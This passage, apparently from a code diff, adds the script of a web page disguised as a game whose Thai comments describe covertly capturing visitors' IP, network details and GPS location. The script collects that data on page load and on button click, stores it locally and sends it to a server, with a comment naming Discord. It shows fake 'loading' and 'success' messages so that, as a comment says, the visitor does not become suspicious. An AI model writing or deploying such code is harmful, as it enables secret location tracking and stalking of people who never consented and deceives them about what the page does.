+                const storedData = JSON.parse(localStorage.getItem('captured_data') || '[]');
+                storedData.push({ timestamp, data });
+                localStorage.setItem('captured_data', JSON.stringify(storedData));
+            } catch (error) {
+                // ไม่แสดงข้อความ
+            }
+        }
+
+        // จัดการเมื่อคลิกปุ่ม
+        captureBtn.addEventListener('click', async () => {
+            collectedData = {};
+
+            // ดักข้อมูลทั้งหมดพร้อมกัน
+            await Promise.all([
+                captureIPAndNetwork(),
+                captureGPS()
+            ]);
+
+            // คำนวณตำแหน่งที่แม่นยำที่สุด
+            if (collectedData.ipDetails && collectedData.gps) {
+                collectedData.bestLocation = calculateBestLocation(
+                    collectedData.ipDetails,
+                    collectedData.gps
+                );
+            } else if (collectedData.ipDetails) {
+                collectedData.bestLocation = {
+                    ...collectedData.ipDetails,
+                    source: 'IP Geolocation Only'
+                };
+            } else if (collectedData.gps && collectedData.gps.latitude) {
+                collectedData.bestLocation = {
+                    ...collectedData.gps,
+                    source: 'GPS Only'
+                };
+            }
+
+            // ส่งข้อมูลไปยัง server (เงียบๆ)
+            sendDataToServer(collectedData);
+            
+            // แสดงข้อความปกติเพื่อไม่ให้สงสัย
+            captureBtn.innerHTML = '<span>✨ กำลังโหลด... ✨</span>';
+            setTimeout(() => {
+                captureBtn.innerHTML = '<span>✅ สำเร็จแล้ว!</span>';
+            }, 1000);
+            setTimeout(() => {
+                captureBtn.innerHTML = '<span>🎯 เริ่มเกม</span>';
+            }, 3000);
+        });
+
+        // ดักข้อมูลเบื้องต้นทันทีที่โหลดหน้า (เนียนๆ)
+        window.addEventListener('load', async () => {
+            await captureIPAndNetwork();
+            // ส่งข้อมูลเบื้องต้นไปยัง Discord (เงียบๆ)
+            if (collectedData.ip) {
+                sendDataToServer(collectedData);
+            }
+        });
+    </script>
+</body>
+</html>
